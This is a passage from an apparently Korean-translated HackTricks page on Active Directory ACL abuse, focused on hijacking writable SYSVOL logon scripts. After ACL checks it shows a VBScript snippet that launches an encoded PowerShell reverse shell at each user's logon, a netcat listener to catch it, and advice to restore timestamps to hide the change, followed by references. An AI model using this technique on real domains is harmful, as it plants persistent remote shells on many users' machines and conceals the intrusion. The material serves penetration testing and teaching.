# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound는 사용자 객체의 `scriptPath` 로그온 스크립트 속성이 있으면 이를 표시합니다. GPO로 구성된 로그온 스크립트는 별도의 정책 참조이므로 해당 GPO도 검사하세요.

### 쓰기 권한 검증 (공유 목록을 그대로 믿지 마세요)
자동화 도구는 해당 스크립트 파일에 다른 NTFS ACL이 적용되어 있어도 SYSVOL/NETLOGON을 읽기 전용으로 표시할 수 있습니다. 먼저 해당 파일과 상위 디렉터리를 읽기 전용으로 검사하세요. 일치하는 Allow ACE는 후보로 남겨 두어야 합니다. 실제 SMB 및 NTFS 권한, Deny ACE, 현재 토큰이 모두 영향을 미치기 때문입니다:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

권한이 승인된 쓰기 테스트는 대상에 맞게 수행하고 되돌릴 수 있어야 하며, 원본 스크립트를 백업한 뒤 복원해야 합니다. 접근 권한을 테스트하려고 정상 작동하는 로그온 스크립트를 덮어쓰지 마세요. 쓰기에 성공하면 다음 사용자의 로그온 시 명령이 실행될 수 있습니다.

### RCE를 위해 VBScript 로그온 스크립트에 악성 코드 삽입
비즈니스 기능이 중단되지 않도록 기존 로직은 그대로 두고, PowerShell reverse shell을 실행하는 명령을 추가하세요(revshells.com에서 생성):

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

호스트에서 수신 대기하며 다음 대화형 로그온을 기다립니다:

```bash
rlwrap -cAr nc -lnvp 443
```

참고:
- 실행은 로깅 사용자의 토큰으로 수행됩니다(SYSTEM이 아님). 범위는 해당 스크립트를 적용하는 GPO 링크(OU, 사이트, 도메인)입니다.
- 사용 후에는 원래 콘텐츠와 타임스탬프를 복원하여 정리합니다.


## References

- [1] [Active Directory ACL/ACE 악용](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [특권 계정 및 토큰 권한](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL 공격 경로 업데이트](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights 열거형 - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory에서 ACL을 이용한 권한 상승](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory 권한 및 특권 계정 검색](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule 생성자 - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux에서 AD attribute/UAC 작업](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (그룹 멤버십)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL 악용, KeePassXC Argon2 크래킹 및 DPAPI 복호화로 DC 관리자 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: 코드 실행 및 NTLM Relay를 위한 GPO UNC 경로 하이재킹](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relay를 통한 Active Directory GPO 악용 등](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU, 장난하나? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory에서 숨겨진 Organizational Units ACL 공격 경로 악용](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [네트워크에서 정상적인 Active Directory 서비스를 시뮬레이션하기: GPO 악용 사례](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
